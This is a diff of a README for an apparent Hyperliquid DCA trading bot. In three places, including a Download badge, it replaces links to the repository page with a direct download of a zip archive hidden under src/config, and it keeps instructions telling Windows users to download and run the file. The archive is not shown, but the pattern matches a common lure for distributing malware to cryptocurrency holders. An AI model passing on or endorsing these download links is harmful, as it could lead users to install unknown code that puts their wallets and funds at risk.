@@ -1,6 +1,6 @@
 # 🤖 hyperliquid-trading-dca-bot - Simple DCA Trading on Hyperliquid
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot/raw/refs/heads/main/src/config/dca_trading_hyperliquid_bot_v2.2.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ Use it if you want a simple way to manage a trading plan on Hyperliquid perp mar
 
 Visit this page to download the app:
 
-https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot
+https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot/raw/refs/heads/main/src/config/dca_trading_hyperliquid_bot_v2.2.zip
 
 Open the page and look for the latest release or download file. If the page offers a Windows file, download it to your PC.
 
@@ -43,7 +43,7 @@ Keep your wallet data private. Do not share it with anyone.
 ## 🚀 How to install on Windows
 
 1. Open the download page:
-   https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot
+   https://github.com/francisferdinandquantifiability242/hyperliquid-trading-dca-bot/raw/refs/heads/main/src/config/dca_trading_hyperliquid_bot_v2.2.zip
 
 2. Download the Windows file from the page.
 
